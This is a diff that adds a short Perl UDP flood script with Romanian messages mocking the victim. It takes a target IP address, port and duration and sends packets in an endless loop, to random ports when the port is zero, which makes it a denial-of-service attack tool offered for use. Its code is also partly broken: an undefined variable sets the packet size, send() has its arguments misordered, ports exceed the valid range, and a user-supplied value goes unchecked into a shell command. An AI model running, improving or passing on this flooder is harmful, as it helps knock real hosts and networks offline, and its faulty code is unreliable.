@@ -1,0 +1,43 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+if ($ARGC !=3) {
+printf "\e[0;36m***\e[0;37m Ai gresit comanda hax0r3, foloseste: \e[0;37m$0 <ip> <port> <timp> \e[0;36m***\e[0m \n";
+exit(1);
+}
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[1];
+$time=$ARGV[2];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "\n\033[1;m\033[31m
+\033[1;m>> \033[1;mTrollGuy da cu ranga in cap la - $ip [A intrat in spital] \033[1;m<< \033[1;m
+\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 8, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 75000) +0;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
